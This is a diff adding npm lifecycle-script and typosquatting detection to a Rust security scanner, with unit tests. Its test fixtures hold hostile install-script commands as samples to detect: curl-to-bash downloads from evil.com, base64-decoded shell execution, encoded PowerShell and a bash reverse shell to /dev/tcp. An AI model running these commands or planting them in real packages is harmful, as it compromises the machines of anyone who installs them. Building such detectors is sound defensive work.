@@ -890,6 +890,278 @@ fn scan_cargo_build_scripts(root: &Path, verbose: bool) -> Vec<Finding> {
     findings
 }
 
+// ---- npm / package.json analysis ----
+
+/// Dangerous npm lifecycle script names that run automatically.
+const NPM_LIFECYCLE_SCRIPTS: &[&str] = &[
+    "preinstall",
+    "install",
+    "postinstall",
+    "preuninstall",
+    "postuninstall",
+    "prepublish",
+    "preprepare",
+    "prepare",
+    "postprepare",
+];
+
+/// Well-known popular npm packages (used for typosquatting detection).
+const POPULAR_NPM_PACKAGES: &[&str] = &[
+    "express", "react", "react-dom", "lodash", "axios", "chalk", "commander",
+    "webpack", "babel", "eslint", "prettier", "typescript", "jest", "mocha",
+    "moment", "underscore", "request", "async", "debug", "bluebird",
+    "mongoose", "sequelize", "dotenv", "cors", "body-parser", "uuid",
+    "fs-extra", "glob", "minimist", "yargs", "inquirer", "socket.io",
+    "passport", "jsonwebtoken", "bcrypt", "nodemon", "pm2", "electron",
+    "next", "nuxt", "vue", "angular", "svelte", "tailwindcss", "postcss",
+    "rollup", "vite", "esbuild", "turbo", "nx", "lerna", "rimraf",
+    "mkdirp", "cross-env", "concurrently", "husky", "lint-staged",
+    "nodemailer", "puppeteer", "cheerio", "sharp", "jimp", "got",
+    "node-fetch", "superagent", "graphql", "apollo", "prisma", "knex",
+    "typeorm", "redis", "ioredis", "pg", "mysql2", "mongodb",
+];
+
+/// Simple edit distance (Levenshtein) for short strings.
+fn edit_distance(a: &str, b: &str) -> usize {
+    let a_bytes = a.as_bytes();
+    let b_bytes = b.as_bytes();
+    let m = a_bytes.len();
+    let n = b_bytes.len();
+
+    if m == 0 { return n; }
+    if n == 0 { return m; }
+
+    let mut prev: Vec<usize> = (0..=n).collect();
+    let mut curr = vec![0; n + 1];
+
+    for i in 1..=m {
+        curr[0] = i;
+        for j in 1..=n {
+            let cost = if a_bytes[i - 1] == b_bytes[j - 1] { 0 } else { 1 };
+            curr[j] = (prev[j] + 1)
+                .min(curr[j - 1] + 1)
+                .min(prev[j - 1] + cost);
+        }
+        std::mem::swap(&mut prev, &mut curr);
+    }
+    prev[n]
+}
+
+/// Check a dependency name for typosquatting against popular packages.
+fn check_typosquatting(name: &str) -> Option<&'static str> {
+    for &popular in POPULAR_NPM_PACKAGES {
+        if name == popular {
+            return None; // exact match, it IS the popular package
+        }
+        // Only check packages with similar length
+        let len_diff = (name.len() as isize - popular.len() as isize).unsigned_abs();
+        if len_diff > 2 {
+            continue;
+        }
+        let dist = edit_distance(name, popular);
+        if dist == 1 {
+            return Some(popular);
+        }
+        // Also check common typosquatting patterns: prefix/suffix manipulation
+        if name.starts_with(&format!("{}-", popular))
+            || name.ends_with(&format!("-{}", popular))
+            || name == &format!("{}s", popular)
+            || name == &format!("{}js", popular)
+            || name == &format!("{}-js", popular)
+            || name == &format!("node-{}", popular)
+            || name.replace('-', "") == popular.replace('-', "")
+        {
+            if dist <= 3 && name != popular {
+                return Some(popular);
+            }
+        }
+    }
+    None
+}
+
+/// Analyze a package.json scripts section for suspicious lifecycle scripts.
+fn analyze_npm_scripts(
+    pkg_json_path: &Path,
+    pkg_value: &serde_json::Value,
+    pkg_label: &str,
+    rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
+    let file_str = pkg_json_path.display().to_string();
+    let Some(scripts) = pkg_value.get("scripts").and_then(|s| s.as_object()) else {
+        return;
+    };
+
+    for &lifecycle in NPM_LIFECYCLE_SCRIPTS {
+        if let Some(cmd) = scripts.get(lifecycle).and_then(|c| c.as_str()) {
+            let severity = if lifecycle == "preinstall" || lifecycle == "postinstall" || lifecycle == "install" {
+                Severity::High
+            } else {
+                Severity::Medium
+            };
+
+            findings.push(Finding::new(
+                severity,
+                &file_str,
+                &format!(
+                    "{}: lifecycle script '{}': {}",
+                    pkg_label,
+                    lifecycle,
+                    truncate(cmd, 120),
+                ),
+            ));
+
+            // Analyze the script content with pattern rules
+            for rule in rules {
+                if rule.pattern.is_match(cmd) {
+                    findings.push(Finding::new(
+                        rule.severity.clone(),
+                        &file_str,
+                        &format!(
+                            "{}: {} in '{}' script: {}",
+                            pkg_label,
+                            rule.description,
+                            lifecycle,
+                            truncate(cmd, 100),
+                        ),
+                    ));
+                }
+            }
+        }
+    }
+}
+
+/// Scan root package.json and all dependencies in node_modules.
+fn scan_npm_packages(root: &Path, verbose: bool) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let rules = build_content_rules();
+    let pkg_json_path = root.join("package.json");
+
+    // 1. Analyze root package.json
+    if let Ok(content) = fs::read_to_string(&pkg_json_path) {
+        if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) {
+            analyze_npm_scripts(&pkg_json_path, &pkg, "root", &rules, &mut findings);
+
+            // Check all dependency sections for typosquatting
+            for section in &["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"] {
+                if let Some(deps) = pkg.get(*section).and_then(|d| d.as_object()) {
+                    for dep_name in deps.keys() {
+                        if let Some(similar_to) = check_typosquatting(dep_name) {
+                            findings.push(Finding::new(
+                                Severity::High,
+                                &pkg_json_path.display().to_string(),
+                                &format!(
+                                    "Possible typosquat: '{}' in {} is similar to popular package '{}'",
+                                    dep_name, section, similar_to,
+                                ),
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // 2. Scan node_modules for dependencies with install scripts
+    let node_modules = root.join("node_modules");
+    if !node_modules.is_dir() {
+        if verbose {
+            println!("  node_modules/ not found, skipping dependency install script scan.");
+        }
+        return findings;
+    }
+
+    let mut deps_with_scripts: Vec<(String, PathBuf)> = Vec::new();
+
+    // Walk top-level and scoped packages in node_modules
+    let scan_pkg = |pkg_dir: &Path, findings: &mut Vec<Finding>, deps_with_scripts: &mut Vec<(String, PathBuf)>, rules: &[PatternRule], verbose: bool| {
+        let dep_pkg_json = pkg_dir.join("package.json");
+        if !dep_pkg_json.exists() {
+            return;
+        }
+        let Ok(content) = fs::read_to_string(&dep_pkg_json) else {
+            return;
+        };
+        let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) else {
+            return;
+        };
+
+        let pkg_name = pkg
+            .get("name")
+            .and_then(|n| n.as_str())
+            .unwrap_or("unknown");
+
+        // Check if it has lifecycle scripts
+        let has_lifecycle = pkg
+            .get("scripts")
+            .and_then(|s| s.as_object())
+            .map(|scripts| {
+                NPM_LIFECYCLE_SCRIPTS
+                    .iter()
+                    .any(|ls| scripts.contains_key(*ls))
+            })
+            .unwrap_or(false);
+
+        if has_lifecycle {
+            deps_with_scripts.push((pkg_name.to_string(), dep_pkg_json.clone()));
+            let label = format!("dep:{}", pkg_name);
+            analyze_npm_scripts(&dep_pkg_json, &pkg, &label, rules, findings);
+        }
+
+        // Also check for binding.gyp (native addon that runs install scripts)
+        if pkg_dir.join("binding.gyp").exists() {
+            if verbose {
+                findings.push(Finding::new(
+                    Severity::Low,
+                    &dep_pkg_json.display().to_string(),
+                    &format!("dep:{}: has binding.gyp (native addon, compiles C/C++ on install)", pkg_name),
+                ));
+            }
+        }
+    };
+
+    // Top-level packages
+    if let Ok(entries) = fs::read_dir(&node_modules) {
+        for entry in entries.filter_map(|e| e.ok()) {
+            let path = entry.path();
+            let name = entry.file_name().to_string_lossy().to_string();
+
+            if name.starts_with('.') {
+                continue;
+            }
+
+            if name.starts_with('@') {
+                // Scoped package: @scope/name
+                if let Ok(scoped_entries) = fs::read_dir(&path) {
+                    for scoped_entry in scoped_entries.filter_map(|e| e.ok()) {
+                        scan_pkg(&scoped_entry.path(), &mut findings, &mut deps_with_scripts, &rules, verbose);
+                    }
+                }
+            } else {
+                scan_pkg(&path, &mut findings, &mut deps_with_scripts, &rules, verbose);
+            }
+        }
+    }
+
+    if !deps_with_scripts.is_empty() {
+        println!(
+            "  Found {} dependencies with install lifecycle scripts:\n",
+            deps_with_scripts.len()
+        );
+        for (name, path) in &deps_with_scripts {
+            println!("    {} {}", "-".dimmed(), name.bold());
+            if verbose {
+                println!("      {}", path.display().to_string().dimmed());
+            }
+        }
+        println!();
+    } else {
+        println!("  No dependencies with install lifecycle scripts found.");
+    }
+
+    findings
+}
+
 // ---- External tool integration: semgrep ----
 
 /// Check if a command is available on PATH.
@@ -1371,6 +1643,26 @@ fn main() {
         print_findings(&findings);
     }
 
+    // Scan npm packages
+    let mut npm_scanned = false;
+    if root.join("package.json").exists() {
+        scanned_anything = true;
+        npm_scanned = true;
+        println!(
+            "\n{} {} (npm packages)",
+            "Scanning:".bold(),
+            root.display()
+        );
+        println!("{}", "-".repeat(60));
+
+        let findings = scan_npm_packages(root, cli.verbose);
+        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
+            any_critical = true;
+        }
+        total_findings += findings.len();
+        print_findings(&findings);
+    }
+
     // Run semgrep
     println!(
         "\n{} {} (semgrep)",
@@ -1417,16 +1709,18 @@ fn main() {
     let total_scanned = vscode_dirs.len()
         + git_roots.len()
         + cargo_scanned as usize
+        + npm_scanned as usize
         + (!semgrep_findings.is_empty()) as usize
         + (!osv_findings.is_empty()) as usize;
     if total_scanned > 1 {
         println!("\n{}", "=== Overall Summary ===".bold());
         println!(
-            "Scanned {} sources ({} .vscode, {} git, {} cargo, semgrep, osv-scanner), {} total findings",
+            "Scanned {} sources ({} .vscode, {} git, {} cargo, {} npm, semgrep, osv-scanner), {} total findings",
             total_scanned,
             vscode_dirs.len(),
             git_roots.len(),
             cargo_scanned as usize,
+            npm_scanned as usize,
             total_findings,
         );
     }
@@ -2467,5 +2761,305 @@ fn main() {
         }"#;
         let findings = parse_osv_json(json);
         assert_eq!(findings[0].file, "/home/user/project/Cargo.lock");
+    }
+
+    // ---- npm helpers ----
+
+    /// Create a temp dir with package.json and optional node_modules, run npm scan.
+    fn scan_npm_with(root_pkg_json: &str, deps: &[(&str, &str)]) -> Vec<Finding> {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(dir.path().join("package.json"), root_pkg_json).unwrap();
+
+        if !deps.is_empty() {
+            let nm = dir.path().join("node_modules");
+            for (pkg_name, pkg_json_content) in deps {
+                let pkg_dir = if pkg_name.starts_with('@') {
+                    nm.join(pkg_name)
+                } else {
+                    nm.join(pkg_name)
+                };
+                fs::create_dir_all(&pkg_dir).unwrap();
+                fs::write(pkg_dir.join("package.json"), pkg_json_content).unwrap();
+            }
+        }
+
+        scan_npm_packages(dir.path(), false)
+    }
+
+    // ---- Edit distance tests ----
+
+    #[test]
+    fn edit_distance_identical() {
+        assert_eq!(edit_distance("express", "express"), 0);
+    }
+
+    #[test]
+    fn edit_distance_one_char() {
+        assert_eq!(edit_distance("lodash", "lodas"), 1);
+        assert_eq!(edit_distance("expres", "express"), 1);
+        assert_eq!(edit_distance("expresss", "express"), 1);
+    }
+
+    #[test]
+    fn edit_distance_two_chars() {
+        assert_eq!(edit_distance("lodsh", "lodash"), 1); // deletion
+    }
+
+    // ---- Typosquatting tests ----
+
+    #[test]
+    fn typosquat_exact_match_is_ok() {
+        assert!(check_typosquatting("express").is_none());
+        assert!(check_typosquatting("lodash").is_none());
+        assert!(check_typosquatting("react").is_none());
+    }
+
+    #[test]
+    fn typosquat_one_char_diff_is_flagged() {
+        // "expresz" is distance 1 from "express"
+        assert_eq!(check_typosquatting("expresz"), Some("express"));
+    }
+
+    #[test]
+    fn typosquat_missing_char_is_flagged() {
+        // "expres" is distance 1 from "express"
+        assert_eq!(check_typosquatting("expres"), Some("express"));
+    }
+
+    #[test]
+    fn typosquat_extra_char_is_flagged() {
+        // "expresss" is distance 1 from "express"
+        assert_eq!(check_typosquatting("expresss"), Some("express"));
+    }
+
+    #[test]
+    fn typosquat_unrelated_is_ok() {
+        assert!(check_typosquatting("my-unique-package-name").is_none());
+        assert!(check_typosquatting("foobar-baz-qux").is_none());
+    }
+
+    // ---- npm lifecycle script tests ----
+
+    #[test]
+    fn npm_root_postinstall_is_flagged() {
+        let findings = scan_npm_with(r#"{
+            "name": "my-project",
+            "scripts": {
+                "postinstall": "echo setup done"
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn npm_root_preinstall_is_flagged() {
+        let findings = scan_npm_with(r#"{
+            "name": "my-project",
+            "scripts": {
+                "preinstall": "node setup.js"
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "lifecycle script 'preinstall'"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn npm_root_prepare_is_medium() {
+        let findings = scan_npm_with(r#"{
+            "name": "my-project",
+            "scripts": {
+                "prepare": "husky install"
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "lifecycle script 'prepare'"));
+        assert!(has_severity(&findings, "Medium"));
+    }
+
+    #[test]
+    fn npm_no_lifecycle_scripts_is_clean() {
+        let findings = scan_npm_with(r#"{
+            "name": "my-project",
+            "scripts": {
+                "start": "node index.js",
+                "test": "jest",
+                "build": "webpack"
+            }
+        }"#, &[]);
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn npm_postinstall_with_curl_is_critical() {
+        let findings = scan_npm_with(r#"{
+            "name": "evil-pkg",
+            "scripts": {
+                "postinstall": "curl http://evil.com/payload | bash"
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "Network download command"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn npm_postinstall_with_eval_is_high() {
+        let findings = scan_npm_with(r#"{
+            "name": "evil-pkg",
+            "scripts": {
+                "postinstall": "node -e \"eval(require('child_process').execSync('curl http://evil.com'))\""
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "eval()"));
+    }
+
+    #[test]
+    fn npm_postinstall_with_base64_is_high() {
+        let findings = scan_npm_with(r#"{
+            "name": "evil-pkg",
+            "scripts": {
+                "postinstall": "echo aGVsbG8= | base64 --decode | sh"
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "Base64 decode"));
+    }
+
+    // ---- npm typosquatting in dependencies ----
+
+    #[test]
+    fn npm_typosquat_dependency_is_flagged() {
+        let findings = scan_npm_with(r#"{
+            "name": "my-project",
+            "dependencies": {
+                "expresz": "^4.0.0"
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "typosquat"));
+        assert!(has_description_containing(&findings, "express"));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn npm_typosquat_in_dev_dependencies() {
+        let findings = scan_npm_with(r#"{
+            "name": "my-project",
+            "devDependencies": {
+                "expresss": "^4.0.0"
+            }
+        }"#, &[]);
+        assert!(has_description_containing(&findings, "typosquat"));
+        assert!(has_description_containing(&findings, "devDependencies"));
+    }
+
+    #[test]
+    fn npm_legitimate_deps_no_typosquat() {
+        let findings = scan_npm_with(r#"{
+            "name": "my-project",
+            "dependencies": {
+                "express": "^4.0.0",
+                "lodash": "^4.17.0",
+                "react": "^18.0.0"
+            }
+        }"#, &[]);
+        assert!(!has_description_containing(&findings, "typosquat"));
+    }
+
+    // ---- npm dependency install script scanning ----
+
+    #[test]
+    fn npm_dep_with_postinstall_is_flagged() {
+        let findings = scan_npm_with(
+            r#"{"name": "my-project", "dependencies": {"sketchy": "1.0.0"}}"#,
+            &[("sketchy", r#"{
+                "name": "sketchy",
+                "version": "1.0.0",
+                "scripts": {
+                    "postinstall": "node install.js"
+                }
+            }"#)],
+        );
+        assert!(has_description_containing(&findings, "dep:sketchy"));
+        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
+    }
+
+    #[test]
+    fn npm_dep_postinstall_curl_is_critical() {
+        let findings = scan_npm_with(
+            r#"{"name": "my-project", "dependencies": {"evil-dep": "1.0.0"}}"#,
+            &[("evil-dep", r#"{
+                "name": "evil-dep",
+                "version": "1.0.0",
+                "scripts": {
+                    "preinstall": "curl http://evil.com/steal | bash"
+                }
+            }"#)],
+        );
+        assert!(has_description_containing(&findings, "dep:evil-dep"));
+        assert!(has_description_containing(&findings, "Network download command"));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn npm_dep_no_scripts_is_clean() {
+        let findings = scan_npm_with(
+            r#"{"name": "my-project", "dependencies": {"safe-dep": "1.0.0"}}"#,
+            &[("safe-dep", r#"{
+                "name": "safe-dep",
+                "version": "1.0.0",
+                "scripts": {
+                    "test": "jest"
+                }
+            }"#)],
+        );
+        // No lifecycle scripts, no typosquat
+        assert!(!has_description_containing(&findings, "dep:safe-dep"));
+    }
+
+    #[test]
+    fn npm_scoped_dep_with_postinstall() {
+        let findings = scan_npm_with(
+            r#"{"name": "my-project", "dependencies": {"@evil/pkg": "1.0.0"}}"#,
+            &[("@evil/pkg", r#"{
+                "name": "@evil/pkg",
+                "version": "1.0.0",
+                "scripts": {
+                    "postinstall": "node malware.js"
+                }
+            }"#)],
+        );
+        assert!(has_description_containing(&findings, "dep:@evil/pkg"));
+        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
+    }
+
+    // ---- npm full integration ----
+
+    #[test]
+    fn npm_full_malicious_package() {
+        let findings = scan_npm_with(
+            r#"{
+                "name": "my-project",
+                "dependencies": {
+                    "expresz": "^4.0.0",
+                    "evil-dep": "1.0.0"
+                },
+                "scripts": {
+                    "postinstall": "curl http://evil.com/rootkit | bash"
+                }
+            }"#,
+            &[("evil-dep", r#"{
+                "name": "evil-dep",
+                "version": "1.0.0",
+                "scripts": {
+                    "preinstall": "powershell -enc SGVsbG8=",
+                    "postinstall": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+                }
+            }"#)],
+        );
+        let critical_count = findings
+            .iter()
+            .filter(|f| matches!(f.severity, Severity::Critical))
+            .count();
+        assert!(critical_count >= 2, "Expected at least 2 critical findings, got {}", critical_count);
+        assert!(has_description_containing(&findings, "typosquat"));
+        assert!(has_description_containing(&findings, "dep:evil-dep"));
     }
 }
